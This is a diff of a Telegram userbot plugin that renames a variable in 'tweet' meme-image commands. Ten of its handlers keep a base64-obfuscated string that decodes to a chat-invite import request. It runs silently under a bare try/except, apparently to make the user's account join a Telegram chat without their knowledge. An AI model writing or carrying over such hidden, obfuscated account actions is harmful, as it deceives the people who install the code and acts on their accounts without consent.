@@ -4,15 +4,15 @@ from . import *
 @bot.on(Speedo_cmd(pattern=r"tweet(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="tweet(?: |$)(.*)", allow_sudo=True))
 async def nope(kraken):
-    hell = kraken.pattern_match.group(1)
+    speedo = kraken.pattern_match.group(1)
     okvai = await eor(kraken, "Trying to tweet for you...")
-    if not hell:
+    if not speedo:
         if kraken.is_reply:
             (await kraken.get_reply_message()).message
         else:
             await eod(kraken, "I need some text to make a tweet🚶")
             return
-    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(hell))}")
+    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(speedo))}")
     await tweeter[0].click(
         kraken.chat_id,
         reply_to=kraken.reply_to_msg_id,
@@ -41,12 +41,12 @@ async def nekobot(event):
             return
     await eor(event, "Requesting trump to tweet...")
     try:
-        hell = str(
+        speedo = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(speedo)
     except:
         pass
     text = deEmojify(text)
@@ -74,12 +74,12 @@ async def nekobot(event):
             return
     await edit_or_reply(event, "Requesting modi to tweet...")
     try:
-        hell = str(
+        speedo = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(speedo)
     except:
         pass
     text = deEmojify(text)
@@ -107,12 +107,12 @@ async def nekobot(event):
             return
     await eor(event, "Requesting Mia to tweet...")
     try:
-        hell = str(
+        speedo = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(speedo)
     except:
         pass
     text = deEmojify(text)
@@ -140,12 +140,12 @@ async def nekobot(event):
             return
     await eor(event, "Requesting Dani to tweet...")
     try:
-        hell = str(
+        speedo = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(speedo)
     except:
         pass
     text = deEmojify(text)
@@ -174,12 +174,12 @@ async def nekobot(event):
             return
     await edit_or_reply(event, "Requesting pappu to tweet...")
     try:
-        hell = str(
+        speedo = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(speedo)
     except:
         pass
     text = deEmojify(text)
@@ -207,12 +207,12 @@ async def nekobot(event):
             return
     await eor(event, "Requesting sunny to tweet...🥰")
     try:
-        hell = str(
+        speedo = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(speedo)
     except:
         pass
     text = deEmojify(text)
@@ -240,12 +240,12 @@ async def nekobot(event):
             return
     await edit_or_reply(event, "Requesting johhny to tweet...😆")
     try:
-        hell = str(
+        speedo = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(speedo)
     except:
         pass
     text = deEmojify(text)
@@ -273,12 +273,12 @@ async def nekobot(event):
             return
     await edit_or_reply(event, "Requesting baapu to tweet...")
     try:
-        hell = str(
+        speedo = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(speedo)
     except:
         pass
     text = deEmojify(text)
@@ -306,12 +306,12 @@ async def nekobot(event):
             return
     await eor(event, "Your banner is under creation wait a sec...")
     try:
-        hell = str(
+        speedo = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(speedo)
     except:
         pass
     text = deEmojify(text)
@@ -340,12 +340,12 @@ async def nekobot(event):
             return
     await eor(event, "Kanna is writing your text...")
     try:
-        hell = str(
+        speedo = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(speedo)
     except:
         pass
     text = deEmojify(text)
